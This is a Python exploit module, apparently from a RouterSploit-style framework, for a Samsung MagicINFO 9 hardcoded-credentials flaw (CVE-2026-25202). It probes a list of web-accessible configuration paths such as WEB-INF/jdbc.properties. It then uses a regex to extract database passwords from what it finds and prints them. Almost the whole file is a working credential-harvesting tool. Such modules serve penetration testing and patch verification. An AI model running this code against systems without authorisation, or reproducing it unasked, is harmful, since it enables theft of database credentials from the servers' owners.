# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Samsung MagicINFO 9 — Hardcoded Database Credentials (CVE-2026-25202).

Probes the MagicINFO 9 server for publicly accessible configuration endpoints
or exposed configuration files that may disclose hardcoded database credentials.
Checks for unauthenticated access to JDBC property files, application config
JSON, and web-accessible configuration paths.

CVE: CVE-2026-25202
CVSS: 8.0
Version: 1.0.0
"""
import re
from typing import Optional

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

_CONFIG_PATHS = (
    "/MagicInfo/WEB-INF/jdbc.properties",
    "/MagicInfo/WEB-INF/classes/jdbc.properties",
    "/MagicInfo/WEB-INF/applicationContext.xml",
    "/MagicInfo/config/database.json",
    "/MagicInfo/config/db.properties",
    "/MagicInfo/api/v1/config/database",
    "/MagicInfoPremium/WEB-INF/jdbc.properties",
    "/MagicInfo/setup/config.do",
    "/MagicInfo/installer/db-config",
)

_CREDENTIAL_RE = re.compile(
    r'(?:password|passwd|db\.pass|jdbc\.password|db_password)\s*[=:]\s*(\S+)',
    re.IGNORECASE,
)
_CONFIG_INDICATORS = (
    "jdbc",
    "datasource",
    "db.url",
    "db.password",
    "database",
    "connection",
    "spring.datasource",
    "hibernat",
)


def _contains_config(body: str) -> bool:
    """Check if a response body contains database configuration indicators.

    Args:
        body: HTTP response body text.

    Returns:
        True if database configuration keywords are found.
    """
    body_lower = body.lower()
    return any(ind in body_lower for ind in _CONFIG_INDICATORS)


def _extract_credentials(body: str) -> Optional[str]:
    """Attempt to extract a database password from configuration content.

    Args:
        body: HTTP response body text.

    Returns:
        Extracted password value if found, None otherwise.
    """
    m = _CREDENTIAL_RE.search(body)
    if m:
        return m.group(1)
    return None


class Exploit(HTTPClient):
    """Samsung MagicINFO 9 Hardcoded Database Credentials — CVE-2026-25202.

    MagicINFO 9 stores database connection credentials in configuration files
    that may be accessible via the web server context without authentication.
    This module probes known configuration file paths and API endpoints for
    exposed database properties and reports any that disclose credential values.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung MagicINFO 9 Hardcoded DB Credentials (CVE-2026-25202)",
        "description": (
            "Tests MagicINFO 9 for CVE-2026-25202 (CVSS 8.0). Probes for "
            "unauthenticated access to JDBC property files, application config "
            "JSON, and configuration API endpoints that may disclose hardcoded "
            "database credentials."
        ),
        "authors": (
            "Samsung PSIRT advisory",
            "André Henrique (@mrhenrike) - EmbedXPL-Forge port",
        ),
        "references": (
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25202",
            "https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures",
        ),
        "devices": ("Samsung MagicINFO 9 Server",),
    }

    target = OptIP("", "Target IPv4 address")
    port = OptPort(80, "Target HTTP port")
    timeout = OptInteger(10, "HTTP request timeout (seconds)")

    def run(self) -> None:
        """Execute the configuration-exposure probe on all candidate paths."""
        print_status(
            "Probing {} for CVE-2026-25202 (MagicINFO DB credential exposure)".format(
                self.target
            )
        )
        found_any = False
        for path in _CONFIG_PATHS:
            result = self._probe_config(path)
            if result:
                found_any = True
                body_excerpt, cred = result
                print_success(
                    "Config content accessible at: {}".format(path)
                )
                if cred:
                    print_success(
                        "Extracted credential value: {}".format(cred)
                    )
                else:
                    print_status(
                        "  Content snippet: {}".format(body_excerpt[:150])
                    )
        if not found_any:
            print_error(
                "No configuration files exposed — target may be patched or "
                "WEB-INF is not accessible."
            )

    def _probe_config(self, path: str) -> Optional[tuple]:
        """Fetch a configuration path and analyse it for credential content.

        Args:
            path: URL path to probe.

        Returns:
            Tuple of (body_excerpt, credential_or_None) if config content is
            found, None otherwise.
        """
        try:
            resp = self.http_request(
                "GET",
                path,
                headers={"User-Agent": "EmbedXPL-Forge/1.0"},
                timeout=int(self.timeout),
            )
        except Exception:
            return None
        if resp is None:
            return None
        status = getattr(resp, "status_code", 0)
        body = getattr(resp, "text", "") or ""
        if status in (404, 403, 0):
            return None
        if _contains_config(body):
            cred = _extract_credentials(body)
            return (body[:300], cred)
        return None

    @mute
    def check(self) -> bool:
        """Check if any configuration endpoint is accessible and contains DB info.

        Returns:
            True if at least one configuration path discloses database content.
        """
        for path in _CONFIG_PATHS:
            if self._probe_config(path) is not None:
                return True
        return False
